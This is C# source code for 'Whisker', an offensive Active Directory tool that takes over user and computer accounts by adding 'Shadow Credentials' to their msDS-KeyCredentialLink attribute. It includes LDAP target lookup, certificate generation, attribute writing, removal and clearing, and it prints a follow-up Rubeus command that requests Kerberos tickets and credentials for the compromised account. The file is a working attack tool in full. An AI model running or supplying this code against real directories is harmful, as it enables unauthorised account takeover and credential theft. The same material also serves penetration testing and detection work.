using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using DSInternals.Common.Data;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.Collections.Generic;
using System.Reflection;

namespace Whisker
{
    public class Program
    {
        //Code taken from Rubeus
        private static DirectoryEntry GetLdapSearchRoot(string OUName, string domainController, string domain)
        {
            DirectoryEntry directoryObject = null;
            string ldapPrefix = "";
            string ldapOu = "";

            //If we have a DC then use that instead of the domain name so that this works if user doesn't have
            //name resolution working but specified the IP of a DC
            if (!String.IsNullOrEmpty(domainController))
            {
                ldapPrefix = domainController;
            }
            else if (!String.IsNullOrEmpty(domain)) //If we don't have a DC then use the domain name (if we have one)
            {
                ldapPrefix = domain;
            }

            if (!String.IsNullOrEmpty(OUName))
            {
                ldapOu = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
            }
            else if (!String.IsNullOrEmpty(domain))
            {
                ldapOu = String.Format("DC={0}", domain.Replace(".", ",DC="));
            }

            //If no DC, domain, credentials, or OU were specified
            if (String.IsNullOrEmpty(ldapPrefix) && String.IsNullOrEmpty(ldapOu))
            {
                directoryObject = new DirectoryEntry();
            }
            else //If we have a prefix (DC or domain), an OU path, or both
            {
                string bindPath = "";
                if (!String.IsNullOrEmpty(ldapPrefix))
                {
                    bindPath = String.Format("LDAP://{0}", ldapPrefix);
                }
                if (!String.IsNullOrEmpty(ldapOu))
                {
                    if (!String.IsNullOrEmpty(bindPath))
                    {
                        bindPath = String.Format("{0}/{1}", bindPath, ldapOu);
                    }
                    else
                    {
                        bindPath = String.Format("LDAP://{1]", ldapOu);
                    }
                }

                directoryObject = new DirectoryEntry(bindPath);
            }

            if (directoryObject != null)
            {
                directoryObject.AuthenticationType = AuthenticationTypes.Secure | AuthenticationTypes.Sealing | AuthenticationTypes.Signing;
            }

            return directoryObject;
        }

        //Code taken from Rubeus
        private static DirectoryEntry LocateAccount(string username, string domain, string domainController)
        {
            DirectoryEntry directoryObject = null;
            DirectorySearcher userSearcher = null;

            try
            {
                directoryObject = GetLdapSearchRoot("", domainController, domain);
                userSearcher = new DirectorySearcher(directoryObject);
                userSearcher.PageSize = 1;
            }
            catch (Exception ex)
            {
                if (ex.InnerException != null)
                {
                    Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
                }
                return null;
            }

            // check to ensure that the bind worked correctly
            try
            {
                string dirPath = directoryObject.Path;
                Console.WriteLine("[*] Searching for the target account");
            }
            catch (DirectoryServicesCOMException ex)
            {
                Console.WriteLine("\r\n[X] Error validating the domain searcher: {0}", ex.Message);
                return null;
            }

            try
            {
                string userSearchFilter = String.Format("(samAccountName={0})", username);
                userSearcher.Filter = userSearchFilter;
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                return null;
            }

            try
            {
                SearchResult user = userSearcher.FindOne();

                if (user == null)
                {
                    Console.WriteLine("[!] Target user not found");
                }

                string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                Console.WriteLine("[*] Target user found: {0}", distinguishedName);

                return user.GetDirectoryEntry();

            }
            catch (Exception ex)
            {
                if (ex.InnerException != null)
                {
                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
                }
                return null;
            }
        }

        //Code taken from https://stackoverflow.com/questions/13806299/how-can-i-create-a-self-signed-certificate-using-c
        static X509Certificate2 GenerateSelfSignedCert(string cn)
        {
            RSA rsa = new RSACryptoServiceProvider(2048, new CspParameters(24, "Microsoft Enhanced RSA and AES Cryptographic Provider", Guid.NewGuid().ToString()));
            CertificateRequest req = new CertificateRequest(String.Format("cn={0}", cn), rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            X509Certificate2 cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
            return cert;
        }

        static void SaveCert(X509Certificate2 cert, string path, string password)
        {
            // Create PFX (PKCS #12) with private key
            File.WriteAllBytes(path, cert.Export(X509ContentType.Pfx, password));
        }

        private static void PrintHelp()
        {
            string usage = @"
Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their 
msDS-KeyCredentialLink attribute, effectively adding Shadow Credentials to the target account.

  Usage: ./Whisker.exe [list|add|remove|clear] /target:<samAccountName> [/deviceID:<GUID>] [/domain:<FQDN>]
               [/dc:<IP/HOSTNAME>] [/password:<PASWORD>] [/path:<PATH>] 

  Modes 
    list            List all the values of the the msDS-KeyCredentialLink attribute of a target object
    add             Add a new value to the msDS-KeyCredentialLink attribute of a target object
    remove          Remove a value from the msDS-KeyCredentialLink attribute of a target object
    clear           Clear all the values of the the msDS-KeyCredentialLink attribute of a target object.
                    Warning: Clearing the msDS-KeyCredentialLink attribute of accounts configured for 
                    passwordless authentication will cause disruptions.

  Arguments:
    /target:<samAccountName>  Required. Set the target name. Computer objects should end with a '$' sign.

    /deviceID:<GUID>          [remove mode] Required in remove mode. Set the DeviceID of the value to remove from the
                              attribute msDS-KeyCredentialLink of the target object. Must be a valid GUID.  

    [/domain:<FQDN>]          Optional. Set the target Fully Qualified Domain Name (FQDN). If not provided, will try to
                              resolve the FQDN of the current user.

    [/dc:<IP/HOSTNAME>]       Optional. Set the target Domain Controller (DC). If not provided, will try to target the
                              Primary Domain Controller (PDC).

    [/password:<PASWORD>]     [add mode] Optional in add mode. Set the password for the stored self-signed certificate. 
                              If not provided, a random password will be generated.

    [/path:<PATH>]            [add mode] Optional in add mode. Set the path to store the generated self-signed certificate 
                              for authentication. If not provided, the certificate will be printed as a Base64 blob.

==[Examples]=========

  list    => Whisker.exe list /target:computername$ /domain:constoso.local /dc:dc1.contoso.local
  add     => Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
  remove  => Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /deviceid:2de4643a-2e0b-438f-a99d-5cb058b3254b
  clear   => Whisker.exe clear /target:computername$ /domain:constoso.local /dc:dc1.contoso.local

For this attack to succeed, the environment must have a Domain Controller running at least Windows Server 2016,
and the Domain Controller must have a server authentication certificate to allow for PKINIT Kerberos authentication.

This tool is based on code from DSInternals by Michael Grafnetter (@MGrafnetter).
";
            Console.WriteLine(usage);
        }

        private static string GenerateRandomPassword()
        {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[16];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            return new string(stringChars);
        }

        private static void DecodeDnWithBinary(object dnWithBinary, out byte[] binaryPart, out string dnString)
        {
            System.Type type = dnWithBinary.GetType();

            binaryPart = (byte[])type.InvokeMember(
            "BinaryValue",
            BindingFlags.GetProperty,
            null,
            dnWithBinary,
            null
            );

            dnString = (string)type.InvokeMember(
            "DNString",
            BindingFlags.GetProperty,
            null,
            dnWithBinary,
            null
            );
        }

        public static void Main(string[] args)
        {
            try
            {
                string command = null;
                if (args.Length > 0)
                {
                    command = args[0].ToLower();
                }

                if (String.IsNullOrEmpty(command) || command.Equals("help") || !(command.Equals("add") || command.Equals("remove") || command.Equals("clear") || command.Equals("list")))
                {
                    PrintHelp();
                    return;
                }

                var arguments = new Dictionary<string, string>();
                for (int i = 1; i < args.Length; i++)
                {
                    string argument = args[i];
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                    {
                        arguments[argument.Substring(1, idx - 1).ToLower()] = argument.Substring(idx + 1);
                    }
                    else
                    {
                        idx = argument.IndexOf('=');
                        if (idx > 0)
                        {
                            arguments[argument.Substring(1, idx - 1).ToLower()] = argument.Substring(idx + 1);
                        }
                        else
                        {
                            arguments[argument.Substring(1).ToLower()] = string.Empty;
                        }
                    }
                }

                string target;
                string domain;
                string dc;
                string path;
                string password;
                Guid deviceID = Guid.Empty;

                if (!arguments.ContainsKey("target") || String.IsNullOrEmpty(arguments["target"]))
                {
                    Console.WriteLine("[X] /target is required and must contain the name of the target object.\r\n");
                    PrintHelp();
                    return;
                }
                else
                {
                    target = arguments["target"];
                }

                if (command.Equals("remove"))
                {
                    try
                    {
                        Guid.TryParse(arguments["deviceid"], out deviceID);
                    }
                    catch
                    {
                        Console.WriteLine("[X] No valid Guid was provided for /deviceid");
                        return;
                    }
                }


                if (!arguments.ContainsKey("domain") || String.IsNullOrEmpty(arguments["domain"]))
                {
                    try
                    {
                        domain = Domain.GetCurrentDomain().Name; //if domain is null, this will try to find the current user's domain
                    }
                    catch
                    {
                        Console.WriteLine("[!] Could not resolve the current user's domain. Please use the /domain option to specify the Fully Qualified Domain Name (FQDN)");
                        return;
                    }
                }
                else
                {
                    domain = arguments["domain"];
                }

                if (!arguments.ContainsKey("dc") || String.IsNullOrEmpty(arguments["dc"]))
                {
                    try
                    {
                        dc = Domain.GetCurrentDomain().PdcRoleOwner.Name; //if dc is null, this will try to find the PDC in current user's domain
                    }
                    catch
                    {
                        Console.WriteLine("[!] Could not locate the DC. Please use the /dc option to specify the DC's IP/hostname");
                        return;
                    }
                }
                else
                {
                    dc = arguments["dc"];
                }

                if (!arguments.ContainsKey("path") || String.IsNullOrEmpty(arguments["path"]))
                {
                    path = "";
                }
                else
                {
                    path = arguments["path"];
                }

                if (!arguments.ContainsKey("password") || String.IsNullOrEmpty(arguments["password"]))
                {
                    password = "";
                }
                else
                {
                    password = arguments["password"];
                }

                switch (command)
                {
                    case "add":
                        Add(target, domain, dc, path, password);
                        break;
                    case "remove":
                        Remove(target, domain, dc, deviceID);
                        break;
                    case "clear":
                        Clear(target, domain, dc);
                        break;
                    case "list":
                        List(target, domain, dc);
                        break;
                    default:
                        PrintHelp();
                        break;
                }
            }
            catch (System.Exception ex)
            {
                Console.WriteLine("[!] Error: {0}", ex.Message);
                return;
            }
        }

        static void Add(string target, string fqdn, string dc, string path, string password)
        {
            if (String.IsNullOrEmpty(path))
            {
                Console.WriteLine("[*] No path was provided. The certificate will be printed as a Base64 blob", path);
            }
            if (String.IsNullOrEmpty(password))
            {
                password = GenerateRandomPassword();
                Console.WriteLine("[*] No pass was provided. The certificate will be stored with the password {0}", password);
            }

            DirectoryEntry targetObject = LocateAccount(target, fqdn, dc);
            if (targetObject == null)
            {
                return;
            }

            X509Certificate2 cert = null;
            KeyCredential keyCredential = null;

            Console.WriteLine("[*] Generating certificate");
            cert = GenerateSelfSignedCert(target);
            Console.WriteLine("[*] Certificate generated");
            Console.WriteLine("[*] Generating KeyCredential");
            Guid guid = Guid.NewGuid();
            keyCredential = new KeyCredential(cert, guid, targetObject.Properties["distinguishedName"][0].ToString(), DateTime.Now);
            Console.WriteLine("[*] KeyCredential generated with DeviceID {0}", guid.ToString());

            try
            {
                Console.WriteLine("[*] Updating the msDS-KeyCredentialLink attribute of the target object");
                targetObject.Properties["msDS-KeyCredentialLink"].Add(keyCredential.ToDNWithBinary());
                targetObject.CommitChanges();
                Console.WriteLine("[+] Updated the msDS-KeyCredentialLink attribute of the target object");
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Could not update attribute: {0}", e.Message);
                return;
            }

            string certOutput = "";
            try
            {
                if (String.IsNullOrEmpty(path))
                {
                    //Console.WriteLine("[*] The associated certificate is:\r\n");
                    byte[] certBytes = cert.Export(X509ContentType.Pfx, password);
                    certOutput = Convert.ToBase64String(certBytes);
                    //Console.WriteLine(certOutput);
                }
                else
                {
                    Console.WriteLine("[*] Saving the associated certificate to file...");
                    SaveCert(cert, path, password);
                    Console.WriteLine("[*] The associated certificate was saved to {0}", path);
                    certOutput = path;
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Could not save the certificate to file: {0}", e.Message);
            }

            Console.WriteLine("[*] You can now run Rubeus with the following syntax:\r\n");
            Console.WriteLine("Rubeus.exe asktgt /user:{0} /certificate:{1} /password:\"{2}\" /domain:{3} /dc:{4} /getcredentials /show", target, certOutput, password, fqdn, dc);
        }

        static void Remove(string target, string fqdn, string dc, Guid deviceID)
        {
            DirectoryEntry targetObject = LocateAccount(target, fqdn, dc);
            if (targetObject == null)
            {
                return;
            }

            try
            {
                Console.WriteLine("[*] Updating the msDS-KeyCredentialLink attribute of the target object");

                bool found = false;
                for (int i = 0; i < targetObject.Properties["msDS-KeyCredentialLink"].Count; i++)
                {
                    byte[] binaryPart = null;
                    string dnString = null;
                    DecodeDnWithBinary(targetObject.Properties["msDS-KeyCredentialLink"][i], out binaryPart, out dnString);
                    KeyCredential kc = new KeyCredential(binaryPart, dnString);
                    if (kc.DeviceId.Equals(deviceID))
                    {
                        targetObject.Properties["msDS-KeyCredentialLink"].RemoveAt(i);
                        found = true;
                        Console.WriteLine("[+] Found value to remove");
                    }
                }
                if (!found)
                {
                    Console.WriteLine("[X] No value with the provided DeviceID was found for the target object");
                    return;
                }
                targetObject.CommitChanges();
                Console.WriteLine("[+] Updated the msDS-KeyCredentialLink attribute of the target object");
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Could not update attribute: {0}", e.Message);
                return;
            }
        }

        static void Clear(string target, string fqdn, string dc)
        {
            DirectoryEntry targetObject = LocateAccount(target, fqdn, dc);
            if (targetObject == null)
            {
                return;
            }

            try
            {
                Console.WriteLine("[*] Updating the msDS-KeyCredentialLink attribute of the target object");
                targetObject.Properties["msDS-KeyCredentialLink"].Clear();
                targetObject.CommitChanges();
                Console.WriteLine("[+] Updated the msDS-KeyCredentialLink attribute of the target object");
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Could not update attribute: {0}", e.Message);
                return;
            }
        }

        static void List(string target, string fqdn, string dc)
        {
            DirectoryEntry targetObject = LocateAccount(target, fqdn, dc);
            if (targetObject == null)
            {
                return;
            }

            Console.WriteLine("[*] Listing deviced for {0}:", target);
            if (targetObject.Properties["msDS-KeyCredentialLink"].Count == 0)
            {
                Console.WriteLine("[*] No entries!");
            }
            else
            {
                for (int i = 0; i < targetObject.Properties["msDS-KeyCredentialLink"].Count; i++)
                {
                    byte[] binaryPart = null;
                    string dnString = null;
                    DecodeDnWithBinary(targetObject.Properties["msDS-KeyCredentialLink"][i], out binaryPart, out dnString);
                    KeyCredential kc = new KeyCredential(binaryPart, dnString);
                    Console.WriteLine("    DeviceID: {0} | Creation Time: {1}", kc.DeviceId, kc.CreationTime);
                }
            }
        }

    }
}
